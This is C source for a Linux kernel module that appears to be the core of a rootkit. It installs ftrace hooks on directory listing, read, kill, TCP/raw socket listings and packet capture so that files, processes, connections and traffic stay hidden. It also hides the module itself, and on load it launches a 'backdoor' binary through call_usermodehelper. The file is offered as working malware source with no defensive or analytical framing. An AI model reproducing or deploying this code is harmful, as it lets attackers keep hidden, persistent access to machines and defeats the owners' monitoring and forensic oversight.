#include <linux/module.h>
#include <linux/init.h>
#include <linux/sched/signal.h>
#include <linux/kmod.h>
#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("ByteKick");

//to remove warning
struct packet_type;

extern void hide_pid(pid_t pid);
extern void cleanup_hidden_pids(void);
extern void trace_init(void);
extern void trace_cleanup(void);
extern void hide_myself(void);
extern asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
extern asmlinkage long (*orig_tcp6_seq_show)(struct seq_file *seq, void *v);
extern int (*t_real_packet_rcv)(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev);
extern asmlinkage long (*orig_raw_seq_show)(struct seq_file *seq, void *v);
extern asmlinkage long (*orig_raw6_seq_show)(struct seq_file *seq, void *v);
extern int hooked_tpacket_rcv(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev);
extern asmlinkage long hooked_tcp4_seq_show(struct seq_file *s, void *v);
extern asmlinkage long hooked_tcp6_seq_show(struct seq_file *s, void *v);
extern asmlinkage long hooked_raw_seq_show(struct seq_file *seq, void *v);
extern asmlinkage long hooked_raw6_seq_show(struct seq_file *seq, void *v);

extern asmlinkage long hook_getdents64(const struct pt_regs *regs);
extern asmlinkage long (*real_getdents64)(const struct pt_regs *);

extern asmlinkage ssize_t (*orig_read)(const struct pt_regs *regs);
extern notrace asmlinkage ssize_t hook_read(const struct pt_regs *regs);

extern asmlinkage int real_kill(const struct pt_regs *pt_regs);
extern asmlinkage int hooked_kill(const struct pt_regs *pt_regs);

struct ftrace_hook dir_hooks[] = {
	HOOK("__x64_sys_getdents64", hook_getdents64, &real_getdents64),
	HOOK("__x64_sys_read", hook_read, &orig_read),
};

struct ftrace_hook pid_hooks[] = {
	HOOK("__x64_sys_kill", hooked_kill, &real_kill),
};
struct ftrace_hook network_hooks[] = {
        HOOK("tcp4_seq_show", hooked_tcp4_seq_show, &orig_tcp4_seq_show),
        HOOK("tcp6_seq_show", hooked_tcp6_seq_show, &orig_tcp6_seq_show),
        HOOK("tpacket_rcv"  , hooked_tpacket_rcv  , &t_real_packet_rcv),
        HOOK("raw_seq_show", hooked_raw_seq_show, &orig_raw_seq_show),
        HOOK("raw6_seq_show", hooked_raw6_seq_show, &orig_raw6_seq_show),

};

static int __init rk_init(void)
{
	hide_pid(current->pid);
	fh_install_hooks(dir_hooks, ARRAY_SIZE(dir_hooks));
	fh_install_hooks(network_hooks, ARRAY_SIZE(network_hooks));
	fh_install_hooks(pid_hooks, ARRAY_SIZE(pid_hooks));
	trace_init();
	hide_myself();
	//Start Backdoor
	char *argv[] = { "/root/hide_ts_fuxSocy/backdoor", NULL };
	call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_EXEC);
	return 0;
}

static void __exit rk_exit(void)
{
	trace_cleanup();
	fh_remove_hooks(dir_hooks, ARRAY_SIZE(dir_hooks));
	fh_remove_hooks(network_hooks, ARRAY_SIZE(network_hooks));
	fh_remove_hooks(pid_hooks, ARRAY_SIZE(pid_hooks));
	cleanup_hidden_pids();
}

module_init(rk_init);
module_exit(rk_exit);

